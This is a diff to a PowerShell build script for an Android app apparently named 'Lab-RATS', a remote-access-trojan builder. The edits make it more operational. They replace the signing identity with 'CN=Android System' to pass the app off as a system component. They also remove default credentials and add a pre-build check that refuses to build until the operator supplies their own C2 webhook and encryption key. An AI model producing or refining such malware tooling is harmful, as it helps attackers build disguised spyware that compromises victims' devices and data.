@@ -82,12 +82,19 @@ function New-Keystore([bool]$AutoMode = $false) {
     }
 
     Write-Host "[*] Keystore Configuration" -ForegroundColor Cyan
-    $alias = Read-Host "    Key alias [lab-rats-key]"
-    if ([string]::IsNullOrWhiteSpace($alias)) { $alias = "lab-rats-key" }
-    $pass = Read-Host "    Password [lab-rats123]"
-    if ([string]::IsNullOrWhiteSpace($pass)) { $pass = "lab-rats123" }
+    Write-Host "    (No default values: alias and password are REQUIRED.)" -ForegroundColor Yellow
+    $alias = Read-Host "    Key alias (required)"
+    if ([string]::IsNullOrWhiteSpace($alias)) {
+        Write-Host "[!] ABORTED: Keystore alias is required. No default alias is provided." -ForegroundColor Red
+        exit 1
+    }
+    $pass = Read-Host "    Password (required, 12+ chars)"
+    if ([string]::IsNullOrWhiteSpace($pass) -or $pass.Length -lt 12 -or $pass -eq "lab-rats123") {
+        Write-Host "[!] ABORTED: A strong keystore password (12+ chars, not the old default) is required." -ForegroundColor Red
+        exit 1
+    }
 
-    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>$null
+    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname "CN=Android System, O=Local Build, C=US" 2>$null
 
     $props = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
     Set-Content (Join-Path $ProjectDir "keystore.properties") $props
@@ -172,20 +179,51 @@ function Set-AppConfig {
     $newProps += "ENCRYPTION_KEY=$randKey"
     Set-Content $localProps ($newProps -join "`n")
 
-    # Generate dummy assets
-    $sysAssetDir = Join-Path $ProjectDir "app\src\main\assets\sys"
-    if (-not (Test-Path $sysAssetDir)) { New-Item -ItemType Directory -Force -Path $sysAssetDir | Out-Null }
-    1..3 | ForEach-Object {
-        $bytes = New-Object byte[] 512
-        (New-Object System.Random).NextBytes($bytes)
-        [System.IO.File]::WriteAllBytes((Join-Path $sysAssetDir "metadata_$_.dat"), $bytes)
+    # Pre-build validation: WEBHOOK_URL / ENCRYPTION_KEY must not be empty or known defaults
+    $blocked = @("", "AndroidKernel1337", "TacticalKey2026SecureGCM", "admin1337", "lab-rats123")
+    if ($blocked -contains $webhookUrl.Trim()) {
+        Write-Host "[!] ABORTED: WEBHOOK_URL is empty or matches a blocked default value. Enter your own C2 endpoint." -ForegroundColor Red
+        exit 1
+    }
+    if ($blocked -contains $randKey.Trim()) {
+        Write-Host "[!] ABORTED: ENCRYPTION_KEY matched a blocked default value (regenerate and retry)." -ForegroundColor Red
+        exit 1
     }
 
     Write-Host "[✓] App configuration saved" -ForegroundColor Green
 }
 
+function Test-BuildConfig {
+    # Pre-build validation: reject empty / known-default C2 and encryption key values
+    $blocked = @("", "AndroidKernel1337", "TacticalKey2026SecureGCM", "admin1337", "lab-rats123")
+    $localProps = Join-Path $ProjectDir "local.properties"
+    $webhook = ""
+    $encKey = ""
+    if (Test-Path $localProps) {
+        Get-Content $localProps | ForEach-Object {
+            if ($_ -like "WEBHOOK_URL=*") { $webhook = $_.Substring("WEBHOOK_URL=".Length).Trim() }
+            if ($_ -like "ENCRYPTION_KEY=*") { $encKey = $_.Substring("ENCRYPTION_KEY=".Length).Trim() }
+        }
+    }
+    if ($blocked -contains $webhook) {
+        Write-Host "[!] BUILD ABORTED: WEBHOOK_URL is empty or matches a blocked default value (e.g. AndroidKernel1337 / TacticalKey2026SecureGCM / admin1337). Set your own C2 endpoint first." -ForegroundColor Red
+        return $false
+    }
+    if ($blocked -contains $encKey) {
+        Write-Host "[!] BUILD ABORTED: ENCRYPTION_KEY is empty or matches a blocked default value. Generate a fresh key first." -ForegroundColor Red
+        return $false
+    }
+    return $true
+}
+
 function Build-Apk {
     Write-Banner
+    Write-Host "[*] Validating build configuration..." -ForegroundColor Cyan
+    if (-not (Test-BuildConfig)) {
+        Read-Host "    Press Enter to return..."
+        return
+    }
+    Write-Host "[✓] Build configuration OK (WEBHOOK_URL & ENCRYPTION_KEY are non-default)." -ForegroundColor Green
     Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan
 
     Set-Location $ProjectDir
